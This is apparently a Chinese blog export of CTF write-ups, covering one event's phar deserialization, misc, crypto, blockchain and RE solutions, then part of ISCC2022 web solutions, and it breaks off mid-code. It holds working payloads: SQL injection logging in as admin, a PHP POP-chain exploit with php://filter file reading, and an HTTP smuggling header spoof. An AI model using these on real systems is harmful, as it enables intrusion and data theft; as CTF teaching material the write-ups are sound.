<p>这里需要注意要绕过wakeup魔法函数修改一下LoveNss&quot;:3-&gt;4,这样还是不行，百度之后发现需要对phar包重新校验，找了个校验脚本</p>
<pre><code class="hljs plaintext">from hashlib import sha1
f = open(&#x27;./1.phar&#x27;, &#x27;rb&#x27;).read() 
print(f)
s = f[:-28] 
h = f[-8:] 
#print(h)
newf = s+sha1(s).digest()+h 
print(newf)
open(&#x27;2.phar&#x27;, &#x27;wb&#x27;).write(newf)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031753985.png?x-oss-process=hzy" alt="image-20220803175323880"></p>
<p>然后phar被过滤，骚姿势走起来，压缩包绕过，phar包压缩之后改png上传然后phar读取</p>
<pre><code class="hljs plaintext">phar://./upload/1.png</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031756699.png?x-oss-process=hzy" alt="image-20220803175656584"></p>
<p>NSSCTF{708aa70b-4077-4194-b56c-b89db88a6644}</p>
<h1 id="misc">misc</h1>
<h2 id="signin">Signin</h2>
<p><a href="https://hub.docker.com/layers/hggg/flag/v0/images/sha256-a0893595a0172bf96637fdee8f760248248b1794070f7a300aee5e5d946c9e03?context=explore">Image Layer Details - hggg/flag:v0 | Docker Hub</a></p>
<p>浅找一下就出了，misc嘛，不解释了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031652268.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{WDLJT_SUPER_MY_MAN}</p>
<h2 id="pixel_signin"><strong>Pixel_Signin</strong></h2>
<p>先提取rgb</p>
<pre><code class="hljs plaintext">from PIL import Image
import struct
width = 31
height = 31
img=Image.open(&quot;Pixel_Signin.png&quot;)
s=[]
for i in range(width):
   for j in range(height):
      pi=img.getpixel((j,i))
      for k in range(3):
         s.append(pi[k])
with open(&#x27;flag.txt&#x27;, &#x27;wb&#x27;)as fp:
    for x in s:
        string = struct.pack(&#x27;B&#x27;, x)
        fp.write(string)</code></pre>
<p>得到内容</p>
<pre><code class="hljs plaintext">Gur dhvpx oebja sbk whzcf bire gur ynml qbt vf na Ratyvfu-ynathntr cnatenzn fragrapr gung pbagnvaf nyy gur yrggref bs gur nycunorg. Gur cuenfr vf pbzzbayl hfrq sbe gbhpu-glcvat cenpgvpr, grfgvat glcrjevgref naq pbzchgre xrlobneqf, qvfcynlvat rknzcyrf bs sbagf, naq bgure nccyvpngvbaf vaibyivat grkg jurer gur hfr bs nyy yrggref va gur nycunorg vf qrfverq.Gur rneyvrfg xabja nccrnenapr bs gur cuenfr jnf va Gur Obfgba Wbheany. Va na negvpyr gvgyrq Pheerag Abgrf va gur Sroehnel , rqvgvba, gur cuenfr vf zragvbarq nf n tbbq cenpgvpr fragrapr sbe jevgvat fghqragf N snibevgr pbcl frg ol jevgvat grnpuref sbe gurve chcvyf vf gur sbyybjvat, orpnhfr vg pbagnvaf rirel yrggre bs gur nycunorg N dhvpx oebja sbk whzcf bire gur ynml qbt. Qbmraf bs bgure arjfcncref choyvfurq gur cuenfr bire gur arkg srj zbaguf, nyy hfvat gur irefvba bs gur fragrapr fgnegvat jvgu N engure guna Gur. Gur rneyvrfg xabja hfr bs gur cuenfr fgnegvat jvgu Gur vf sebz gur  obbx Vyyhfgengvir Fubegunaq ol Yvaqn Oebafba. Gur zbqrea sbez fgnegvat jvgu Gur orpnzr zber pbzzba rira gubhtu vg vf fyvtugyl ybatre guna gur bevtvany fgnegvat jvgu N.N  rqvgvba bs gur Ybf Natryrf Urenyq Fhaqnl Zntnmvar erpbeqf gung jura gur Arj Lbex Urenyq jnf rdhvccvat na bssvpr jvgu glcrjevgref n srj lrnef ntb, fgnss sbhaq gung gur pbzzba cenpgvpr fragrapr bs abj vf gur gvzr sbe nyy tbbq zra gb pbzr gb gur nvq bs gur cnegl qvq abg snzvyvnevmr glcvfgf jvgu gur ragver nycunorg, naq ena bagb gjb yvarf va n arjfcncre pbyhza. AFFPGS&#123;Unehxv_vf_AFF_FHCREZNA_fb_guvf_gnfx_vf_rnfl&#125; Gurl jevgr gung n fgnss zrzore anzrq Neguhe S. Phegvf vairagrq gur dhvpx oebja sbk cnatenz gb nqqerff guvf.Nf gur hfr bs glcrjevgref terj va gur yngr gu praghel, gur cuenfr ortna nccrnevat va glcvat yrffba obbxf nf n cenpgvpr fragrapr. Rneyl rknzcyrf vapyhqr Ubj gb Orpbzr Rkcreg va Glcrjevgvat N Pbzcyrgr Vafgehpgbe Qrfvtarq Rfcrpvnyyl sbe gur Erzvatgba Glcrjevgre , naq Glcrjevgvat Vafgehpgbe naq Fgrabtencuref Unaq-obbx. Ol gur ghea bs gur gu praghel, gur cuenfr unq orpbzr jvqryl xabja. Va gur Wnahnel ,vffhr bs Cvgznaf Cubargvp Wbheany, vg vf ersreerq gb nf gur jryy xabja zrzbevmrq glcvat yvar rzoenpvat nyy gur yrggref bs gur nycunorg. Eboreg Onqra-Cbjryyf obbx Fpbhgvat sbe Oblf  hfrf gur cuenfr nf n cenpgvpr fragrapr sbe fvtanyvat.Gur svefg zrffntr frag ba gur ZbfpbjJnfuvatgba ubgyvar ba Nhthfg , , jnf gur grfg cuenfr GUR DHVPX OEBJA SBK WHZCRQ BIRE GUR YNML QBTF ONPX . Yngre, qhevat grfgvat, gur Ehffvna genafyngbef frag n zrffntr nfxvat gurve Nzrevpna pbhagrecnegf, Jung qbrf vg zrna jura lbhe crbcyr fnl Gur dhvpx oebja sbk whzcrq bire gur ynml qbt? Qhevat gur gu praghel, grpuavpvnaf grfgrq glcrjevgref naq gryrcevagref ol glcvat gur fragrapr.Vg vf gur fragrapr hfrq va gur naahny Mnare-Oybfre Angvbany Unaqjevgvat Pbzcrgvgvba, n phefvir jevgvat pbzcrgvgvba juvpu unf orra uryq va gur H.F. fvapr</code></pre>
<p>rot13解密</p>
<pre><code class="hljs plaintext">The quick brown fox jumps over the lazy dog is an English-language pangrama sentence that contains all the letters of the alphabet. The phrase is commonly used for touch-typing practice, testing typewriters and computer keyboards, displaying examples of fonts, and other applications involving text where the use of all letters in the alphabet is desired.The earliest known appearance of the phrase was in The Boston Journal. In an article titled Current Notes in the February , edition, the phrase is mentioned as a good practice sentence for writing students A favorite copy set by writing teachers for their pupils is the following, because it contains every letter of the alphabet A quick brown fox jumps over the lazy dog. Dozens of other newspapers published the phrase over the next few months, all using the version of the sentence starting with A rather than The. The earliest known use of the phrase starting with The is from the  book Illustrative Shorthand by Linda Bronson. The modern form starting with The became more common even though it is slightly longer than the original starting with A.A  edition of the Los Angeles Herald Sunday Magazine records that when the New York Herald was equipping an office with typewriters a few years ago, staff found that the common practice sentence of now is the time for all good men to come to the aid of the party did not familiarize typists with the entire alphabet, and ran onto two lines in a newspaper column. NSSCTF&#123;Haruki_is_NSS_SUPERMAN_so_this_task_is_easy&#125; They write that a staff member named Arthur F. Curtis invented the quick brown fox pangram to address this.As the use of typewriters grew in the late th century, the phrase began appearing in typing lesson books as a practice sentence. Early examples include How to Become Expert in Typewriting A Complete Instructor Designed Especially for the Remington Typewriter , and Typewriting Instructor and Stenographers Hand-book. By the turn of the th century, the phrase had become widely known. In the January ,issue of Pitmans Phonetic Journal, it is referred to as the well known memorized typing line embracing all the letters of the alphabet. Robert Baden-Powells book Scouting for Boys  uses the phrase as a practice sentence for signaling.The first message sent on the MoscowWashington hotline on August , , was the test phrase THE QUICK BROWN FOX JUMPED OVER THE LAZY DOGS BACK . Later, during testing, the Russian translators sent a message asking their American counterparts, What does it mean when your people say The quick brown fox jumped over the lazy dog? During the th century, technicians tested typewriters and teleprinters by typing the sentence.It is the sentence used in the annual Zaner-Bloser National Handwriting Competition, a cursive writing competition which has been held in the U.S. since</code></pre>
<p>NSSCTF{Haruki_is_NSS_SUPERMAN_so_this_task_is_easy}</p>
<h2 id="type-message">Type Message</h2>
<p>附件是一堆按键音</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031208307.png?x-oss-process=hzy" alt="image-20220803120859216">、</p>
<p>用dtmf提取按键，找了很多都不能用，在GitHub找了个可以</p>
<p><a href="https://github.com/ribt/dtmf-decoder">ribt/dtmf-decoder: Extract phone numbers from an audio recording of the dial tones. (github.com)</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031248962.png?x-oss-process=hzy" alt="image-20220803124829879"></p>
<p>然后提取数字之后九键解密</p>
<p>62 74 74 23 81 33 31 81 61 33 43 74 73 32 21 53 53 93 32 21 74 93</p>
<p>NSSCTF{DTMFISREALLYEASY}</p>
<h2 id="knights-tour">Knight’s Tour!</h2>
<p>附件压缩包打不开，查看发现文件头问题</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031357012.png?x-oss-process=hzy" alt="image-20220803135722810"></p>
<p>但是还是解压不出考虑，winrar修复一下，然后解压出来了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031419532.png?x-oss-process=hzy" alt="image-20220803141948453"></p>
<p>骑士之旅，象棋里边的马，走法一样，上棋盘下走法</p>
<p>棋盘只有一个k，逆推一下得到起点坐标是（7，3），跑完之后就是这样</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031438726.png?x-oss-process=hzy" alt="image-20220803143818647"></p>
<p>然后红0黄1，转字符</p>
<pre><code class="hljs plaintext">01000011

01101000

00110001

01110110

01000000

01101100

01110010

01111001</code></pre>
<p><a href="https://www.rapidtables.org/zh-CN/convert/number/binary-to-string.html">二进制到字符串转换器 (rapidtables.org)</a></p>
<p>最后结果Ch1v@lry</p>
<p>NSSCTF{Ch1v@lry}</p>
<h1 id="crypto">crypto</h1>
<h2 id="ezcrypto">ezcrypto</h2>
<p>原题</p>
<p><a href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Dest0g3 520迎新赛 | Lazzaro (lazzzaro.github.io)</a></p>
<p><strong>主要是求seed</strong></p>
<p><strong>爆破得出seed</strong></p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> ecdsa.numbertheory <span class="hljs-keyword">import</span> inverse_mod
a = <span class="hljs-number">2659869614</span>
b = <span class="hljs-number">3138014669</span>
m = <span class="hljs-number">2171187379</span>
state1 = <span class="hljs-number">32421</span>
state2 = <span class="hljs-number">32382</span>
c = <span class="hljs-number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span>
c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]))




<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
    s1 = (state1 &lt;&lt; <span class="hljs-number">16</span>) + i
    s2 = (a * s1 + b) % m
    <span class="hljs-keyword">if</span> s2 &gt;&gt; <span class="hljs-number">16</span> == state2:
        seed = ((s1 - b) * inverse_mod(a, m)) % m
        <span class="hljs-built_in">print</span>(seed)
<span class="hljs-comment"># 255387149</span>
<span class="hljs-comment"># 79695939</span></code></pre>
<p><strong>再求flag</strong></p>
<pre><code class="hljs python">c = <span class="hljs-number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span>
c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]))
seed = [<span class="hljs-number">79695939</span>,<span class="hljs-number">255387149</span>]

<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> seed:
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
            self.a = <span class="hljs-number">2659869614</span>
            self.b = <span class="hljs-number">3138014669</span>
            self.m = <span class="hljs-number">2171187379</span>
            self.seed = k

        <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):
            self.seed = (self.a * self.seed + self.b) % self.m
            <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">16</span>


    lcg = LCG()
    lcg.<span class="hljs-built_in">next</span>()
    lcg.<span class="hljs-built_in">next</span>()
    flag = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):
        flag += <span class="hljs-built_in">chr</span>(c[i] ^ (lcg.<span class="hljs-built_in">next</span>() % <span class="hljs-number">10</span>))
    <span class="hljs-built_in">print</span>(flag)

<span class="hljs-comment">#NSSCTF&#123;378f571491e6559d41ffa02e7a76653e&#125;</span>
<span class="hljs-comment">#IQRBSFy2:5d26&lt;383c?327e4;gfa16a?n6:779er</span></code></pre>
<h1 id="eth">ETH</h1>
<h2 id="bridge">Bridge</h2>
<blockquote>
<p>OKC 地址 0x26eD1a5Ce072aB407C9d24b434f9be43b9ADDCe5 发生了大额快进快出，经过溯源可以找到他来源于一个 BSC 地址，请找出该 Bridge 在 BSC 上的交易tx NSSCTF{0x****************************************************************}</p>
</blockquote>
<p><a href="https://www.oklink.com/zh-cn/okc/address/0x26eD1a5Ce072aB407C9d24b434f9be43b9ADDCe5">OKC区块0x26eD…ADDCe5 块地址 余额 总交易次数 | OKLink区块链浏览器</a></p>
<p>查询okc地址，得到kip20交易地址</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031502637.png?x-oss-process=hzy" alt="image-20220803150203562"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031502882.png?x-oss-process=hzy" alt="image-20220803150232804"></p>
<p>BSC—&gt;OKC,跨链交易</p>
<p>筛选条件，还有相关金额时间，得到源头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031512050.png?x-oss-process=hzy" alt="image-20220803151255948"></p>
<p>NSSCTF{0xf787c44151fe21da13c213e3adaa7796176e09b9364eb6f52aa43e387ce4b455}</p>
<h1 id="re">RE</h1>
<h2 id="hide_and_seek"><strong>hide_and_seek</strong></h2>
<p>动态调试发现需要传入文件名参数，然后就是动调了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208051851165.png?x-oss-process=hzy" alt="image-20220805185135702"></p>
<p>NSSCTF{h1d3_0n_h34p}</p>
<h1 id="总结">总结</h1>
<p>最后第八，难得前十，贴纸我来啦<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031829140.png?x-oss-process=hzy" alt="image-20220803182922932"></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2022</title>
    <url>/2022/05/27/ISCC2022/</url>
    <content><![CDATA[<p>ISCC2022练武题和擂台赛的部分WP</p>
<span id="more"></span>
<h1 id="练武题wp">练武题wp</h1>
<h2 id="web">WEB</h2>
<h3 id="冬奥会">冬奥会</h3>
<p>payload</p>
<pre><code class="hljs plaintext">?Information=&#123;&quot;year&quot;:&quot;a&quot;,&quot;items&quot;:[0,[],3]&#125;</code></pre>
<h3 id="easy-sql">Easy-SQL</h3>
<pre><code class="hljs plaintext">id=0 union TABLE emails limit 7,1</code></pre>
<p>得到源码之后审计</p>
<pre><code class="hljs plaintext">&lt;?php
include &quot;./config.php&quot;;
// error_reporting(0);
// highlight_file(__FILE__);
$conn = mysqli_connect($hostname, $username, $password, $database);
  if ($conn-&gt;connect_errno) &#123;
  die(&quot;Connection failed: &quot; . $conn-&gt;connect_errno);
&#125; 

echo &quot;Where is the database?&quot;.&quot;&lt;br&gt;&quot;;

echo &quot;try ?id&quot;;

function sqlWaf($s)
&#123;
  $filter = &#x27;/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|&quot;|\^|\||\ |\&#x27;/i&#x27;;
  if (preg_match($filter,$s))
      return False;
  return True;
&#125;

if (isset($_GET[&#x27;id&#x27;])) 
&#123;
  $id = $_GET[&#x27;id&#x27;];
  $sql = &quot;select * from users where id=$id&quot;;
  $safe = preg_match(&#x27;/select/is&#x27;, $id);
  if($safe!==0)
      die(&quot;No select!&quot;);
  $result = mysqli_query($conn, $sql);
  if ($result) 
  &#123;
      $row = mysqli_fetch_array($result);
      echo &quot;&lt;h3&gt;&quot; . $row[&#x27;username&#x27;] . &quot;&lt;/h3&gt;&lt;br&gt;&quot;;
      echo &quot;&lt;h3&gt;&quot; . $row[&#x27;passwd&#x27;] . &quot;&lt;/h3&gt;&quot;;
  &#125;
  else
      die(&#x27;&lt;br&gt;Error!&#x27;);
&#125;


if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) 
&#123;

  $username = strval($_POST[&#x27;username&#x27;]);
  $passwd = strval($_POST[&#x27;passwd&#x27;]);

  if ( !sqlWaf($passwd) )
      die(&#x27;damn hacker&#x27;);

  $sql = &quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND passwd= &#x27;$&#123;passwd&#125;&#x27;&quot;;
  $result = $conn-&gt;query($sql);
  if ($result-&gt;num_rows &gt; 0) &#123;
      $row = $result-&gt;fetch_assoc();
      if ( $row[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; $row[&#x27;passwd&#x27;] )
      &#123;
          if ($row[&#x27;passwd&#x27;] == $passwd)
          &#123;
              die($flag);
          &#125; else &#123;
              die(&quot;username or passwd wrong, are you admin?&quot;);
          &#125;
      &#125; else &#123;
          die(&quot;wrong user&quot;);
      &#125;
  &#125; else &#123;
      die(&quot;user not exist or wrong passwd&quot;);
  &#125;
&#125;
mysqli_close($conn); 
?&gt;</code></pre>
<p>payload</p>
<pre><code class="hljs plaintext">username=1&#x27;/**/union/**select/**/1,0x61646d696e,3%23&amp;passwd=3</code></pre>
<h3 id="pop2022">Pop2022</h3>
<p>预期解</p>
<p>exp</p>
<pre><code class="hljs plaintext">&lt;?php
class Road_is_Long&#123;
    public $page;
    public $string;
&#125;

class Try_Work_Hard&#123;
    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;;
&#125;

class Make_a_Change&#123;
    public $effort;
&#125;
$road1=new Road_is_Long();
$road2=new Road_is_Long();
$try=new Try_Work_Hard();
$make=new Make_a_Change();



$make-&gt;effort=$try;
$road2-&gt;string=$make;
$road1-&gt;page=$road2;
$ser=serialize($road1);
echo urlencode($ser);
?wish=O%3A12%3A&quot;Road_is_Long&quot;%3A2%3A&#123;s%3A4%3A&quot;page&quot;%3BO%3A12%3A&quot;Road_is_Long&quot;%3A2%3A&#123;s%3A4%3A&quot;page&quot;%3BN%3Bs%3A6%3A&quot;string&quot;%3BO%3A13%3A&quot;Make_a_Change&quot;%3A1%3A&#123;s%3A6%3A&quot;effort&quot;%3BO%3A13%3A&quot;Try_Work_Hard&quot;%3A1%3A&#123;s%3A6%3A&quot;%00*%00var&quot;%3Bs%3A62%3A&quot;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D..%2F..%2F..%2Fflag&quot;%3B&#125;&#125;&#125;s%3A6%3A&quot;string&quot;%3BN%3B&#125;</code></pre>
<p>非预期解</p>
<pre><code class="hljs plaintext">/flag.php</code></pre>
<h3 id="让我康康">让我康康！</h3>
<p>http请求走私</p>
<p>走私成功，但是显示本地才可以看到，那么添加一下<code>secr3t_ip: 127.0.0.1</code></p>
<p>ISCC{AWEIweiwwwweeeiii_JJj9JJGg5GGG_NONONONO2022}</p>
<h3 id="这是一道代码审计题">这是一道代码审计题</h3>
<p>先访问/index，抓包删除login=0，然后修改url<code>/index?url=127.0.0.1</code>，然后得到<code>./static/code.txt</code>,访问得到</p>
<pre><code class="hljs plaintext">👛👜👝🐗👞👜👥👜👊👠👞👥🐟🐠🐱🐁🐗🐗🐗🐗👠👝🐟👚👦👥👫👩👦👣👖👢👜👰🐴🐴🐨🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗👩👜👥👛👜👩👖👫👜👤👧👣👘👫👜🐟🐙👠👥👛👜👯🐥👟👫👤👣🐙🐠🐁🐗🐗🐗🐗👜👣👪👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐙👐👦👬🐗👟👘👭👜🐗👥👦👫🐗👘👚👚👜👪👪🐗👫👦🐗👫👟👠👪🐗👧👘👞👜🐘🐙🐁🐁👛👜👝🐗👚👟👜👚👢👖👪👪👩👝🐟👬👩👣🐠🐱🐁🐗🐗🐗🐗👟👦👪👫👥👘👤👜🐗🐴🐗👬👩👣👧👘👩👪👜🐟👬👩👣🐠🐥👟👦👪👫👥👘👤👜🐁🐗🐗🐗🐗👫👩👰🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👥👦👫🐗👩👜🐥👤👘👫👚👟🐟🐞👟👫👫👧👪🐶🐱🐦🐦🐟🐶🐱👒🐤👓👮🐥👔👳🐟🐶🐱🐜👒👓👛👘🐤👝🐸🐤🐽👔👲🐩👴🐠🐠🐢🐞🐣🐗👬👩👣🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👥👦👫🐗👩👜🐥👤👘👫👚👟🐟🐞👟👫👫👧👪🐶🐱🐦🐦🐷🐟🐶🐱👒🐤👓👮🐥👔👳🐟🐶🐱🐜👒👓👛👘🐤👝🐸🐤🐽👔👲🐩👴🐠🐠🐢🐞🐣🐗👬👩👣🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👘👠👪👜🐗🐹👘👪👜🐼👯👚👜👧👫👠👦👥🐟🐙👬👩👣🐗👝👦👩👤👘👫🐗👜👩👩👦👩🐙🐠🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗🐗👩👜🐥👤👘👫👚👟🐟🐞👟👫👫👧👪🐶🐱🐦🐦🐷🐟🐶🐱👒🐤👓👮🐥👔👳🐟🐶🐱🐜👒👓👛👘🐤👝🐸🐤🐽👔👲🐩👴🐠🐠🐢🐞🐣🐗👬👩👣🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👡👬👛👞👜👖👠👧🐟👟👦👪👫👥👘👤👜🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗👋👩👬👜🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐣🐗🐙👐👦👬🐗👥👦👫🐗👞👜👫🐗👫👟👜🐗👩👠👞👟👫🐗👚👣👬👜🐘🐙🐁🐗🐗🐗🐗🐗🐗🐗🐗👜👣👪👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👠👧👖👘👛👛👩👜👪👪🐗🐴🐗👪👦👚👢👜👫🐥👞👜👫👘👛👛👩👠👥👝👦🐟👟👦👪👫👥👘👤👜🐣🐞👟👫👫👧🐞🐠👒🐧👔👒🐫👔👒🐧👔🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👠👪👖👠👥👥👜👩👖👠👧👘👛👛👩👜👪👪🐟👠👧👖👘👛👛👩👜👪👪🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐣🐙👠👥👥👜👩🐗👠👧🐗👘👛👛👩👜👪👪🐗👘👫👫👘👚👢🐙🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👜👣👪👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐣🐗🐙👐👦👬🐗👥👦👫🐗👞👜👫🐗👫👟👜🐗👩👠👞👟👫🐗👚👣👬👜🐘🐙🐁🐗🐗🐗🐗👜👯👚👜👧👫🐗🐹👘👪👜🐼👯👚👜👧👫👠👦👥🐗👘👪🐗👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐣🐗👪👫👩🐟👜🐠🐁🐗🐗🐗🐗👜👯👚👜👧👫🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐣🐗🐙👬👥👢👥👦👮🐗👜👩👩👦👩🐙🐁🐁👛👜👝🐗👠👧🐩👣👦👥👞🐟👠👧👖👘👛👛👩🐠🐱🐁🐗🐗🐗🐗👩👜👫👬👩👥🐗👪👫👩👬👚👫🐥👬👥👧👘👚👢🐟🐙🐘👃🐙🐣🐗👪👦👚👢👜👫🐥👠👥👜👫👖👘👫👦👥🐟👠👧👖👘👛👛👩🐠🐠👒🐧👔🐁🐁👛👜👝🐗👠👪👖👠👥👥👜👩👖👠👧👘👛👛👩👜👪👪🐟👠👧🐠🐱🐁🐗🐗🐗🐗👠👧🐗🐴🐗👠👧🐩👣👦👥👞🐟👠👧🐠🐁🐗🐗🐗🐗👧👩👠👥👫🐟👠👧🐠🐁🐗🐗🐗🐗👩👜👫👬👩👥🐗👠👧🐩👣👦👥👞🐟🐞🐨🐩🐮🐥🐧🐥🐧🐥🐧🐞🐠🐗🐵🐵🐗🐩🐫🐗🐴🐴🐗👠👧🐗🐵🐵🐗🐩🐫🐗👦👩🐗👠👧🐩👣👦👥👞🐟🐞🐨🐧🐥🐧🐥🐧🐥🐧🐞🐠🐗🐵🐵🐗🐩🐫🐗🐴🐴🐗👠👧🐗🐵🐵🐗🐩🐫🐗👦👩🐗👠👧🐩👣👦👥👞🐟🐞🐨🐮🐩🐥🐨🐭🐥🐧🐥🐧🐞🐠🐗🐵🐵🐗🐩🐧🐗🐴🐴🐗👠👧🐗🐵🐵🐗🐩🐧🐗👦👩🐗👠👧🐩👣👦👥👞🐟🐞🐨🐰🐩🐥🐨🐭🐯🐥🐧🐥🐧🐞🐠🐗🐵🐵🐗🐨🐭🐗🐴🐴🐗👠👧🐗🐵🐵🐗🐨🐭🐗👦👩🐗👠👧🐩👣👦👥👞🐟🐞🐧🐥🐧🐥🐧🐥🐧🐞🐠🐗🐵🐵🐗🐩🐫🐗🐴🐴🐗👠👧🐗🐵🐵🐗🐩🐫🐁🐁👛👜👝🐗👮👘👝🐨🐟👠👧🐠🐱🐁🐗🐗🐗🐗👝👦👩👙👠👛👛👜👥👖👣👠👪👫🐗🐴🐗👒🐗🐞🐥🐞🐣🐗🐞🐧🐞🐣🐗🐞🐨🐞🐣🐗🐞🐩🐞🐣🐗🐞🐮🐞👔🐁🐗🐗🐗🐗👝👦👩🐗👮👦👩👛🐗👠👥🐗👝👦👩👙👠👛👛👜👥👖👣👠👪👫🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👠👧🐗👘👥👛🐗👮👦👩👛🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐗👮👦👩👛🐗👠👥🐗👠👧🐥👣👦👮👜👩🐟🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗👋👩👬👜🐁🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜🐁🐁👛👜👝🐗👡👬👛👞👜👖👠👧🐟👠👧🐠🐱🐁🐗🐗🐗🐗👠👝🐟👮👘👝🐨🐟👠👧🐠🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👪👣👜🐁🐗🐗🐗🐗👜👣👪👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗👘👛👛👩🐗🐴🐗👘👛👛👩🐥👜👥👚👦👛👜🐟👜👥👚👦👛👠👥👞🐗🐴🐗🐙👬👫👝🐤🐯🐙🐠🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👧👧🐗🐴🐗👙👘👪👜🐭🐫🐥👜👥👚👦👛👜👪👫👩👠👥👞🐟👘👛👛👩🐠🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👧👧🐗🐴🐗👠👧👧🐥👪👫👩👠👧🐟🐠🐥👣👦👮👜👩🐟🐠🐥👛👜👚👦👛👜🐟🐠🐁🐗🐗🐗🐗🐗🐗🐗🐗👠👝🐟👠👧🐴🐴👠👧👧🐠🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👞👣👦👙👘👣🐗👚👦👥👫👩👦👣👖👢👜👰🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👚👦👥👫👩👦👣👖👢👜👰🐗🐴🐗🐨🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗👋👩👬👜🐁🐗🐗🐗🐗🐗🐗🐗🐗👜👣👪👜🐱🐁🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗🐗👩👜👫👬👩👥🐗🐽👘👣👪👜</code></pre>
<p>base100解码得到源码</p>
<pre><code class="hljs plaintext">def geneSign():
    if(control_key==1):
        return render_template(&quot;index.html&quot;)
    else:
        return &quot;You have not access to this page!&quot;

def check_ssrf(url):
    hostname = urlparse(url).hostname
    try:
